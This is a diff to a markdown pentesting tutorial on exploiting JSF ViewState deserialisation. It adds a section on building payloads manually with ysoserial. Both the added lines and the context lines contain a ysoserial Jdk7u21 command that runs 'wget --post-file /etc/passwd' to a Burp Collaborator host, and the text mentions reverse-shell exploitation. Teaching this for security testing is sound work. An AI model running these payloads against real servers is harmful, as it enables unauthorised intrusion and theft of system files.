@@ -157,12 +157,14 @@ Step 4: If the viewstate is vulnerable, it will show **Potentially VULNERABLE!!!
 
 Step 5: Now we got the payload type which is **Jdk7u21** 
 
-<p align="center"><strong>Exploitation</strong></p>
+<p align="center"><strong>Exploitation Phase</strong></p>
 
 NOTE: There are two ways to Exploit a JSF Viewstate Deserialisation
 
 * Out-Of-Band 
 * Reverse Shell
+
+<p align="center"><strong>Exploitation using Burpsuite Extenders</strong></p>
 
 Step 1: Send the vulnerable request to **DS - Exploitation Tab**
 
@@ -178,5 +180,22 @@ Jdk7u21 "wget --post-file /etc/passwd  http://xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
 
 <p align="center">
   <img src="/images/deserialisation/desc20.png">
+</p>
+
+<p align="center"><strong>Manual Payload Creation using Ysoserial</strong></p>
+
+**Ysoserial Syntax** 
+
+```bash
+java -jar ysoserial-[version]-all.jar [payload] '[command]'
+```
+**Payload Command**
+
+```bash
+java -jar ysoserial-master-SNAPSHOT.jar Jdk7u21 "wget --post-file /etc/passwd  http://xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx.burpcollaborator.net" | gzip | base64 -w 0
+```
+ 
+<p align="center">
+  <img src="/images/deserialisation/desc21.png">
 </p>
 
